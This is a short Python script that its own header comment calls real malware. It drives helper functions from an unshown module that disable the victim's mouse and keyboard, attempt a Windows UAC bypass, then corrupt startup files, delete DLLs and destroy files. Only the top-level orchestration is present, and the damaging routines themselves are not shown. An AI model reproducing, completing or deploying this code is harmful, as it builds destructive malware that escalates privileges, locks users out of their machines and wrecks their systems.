# This is malware no joke real malware
# https://codepal.ai
import time

from resource import functions, Ptime, decryption
from resource import encryption, key, hash, crytography_functions


def start():
	try:
		functions.minimize_current_window()
		functions.disable_mouse_keyboard_windows()
		functions.UAC_bypass()
		retitem = True
		time.sleep(2)

	except PermissionError:
		retitem = False

	return retitem


def search_and_destroy():
	try:
		functions.file_fucker()
		time.sleep(1)

		functions.startup_surprise()
		functions.corrupt_startup_files()
		functions.delete_dll()
		retitem = True

	except PermissionError:
		retitem = False

	return retitem

try:
	if start():
		if search_and_destroy():
			print("Success")
		else:
			print("Failed")
	else:
		print("Failed")

except:
	print("Failed")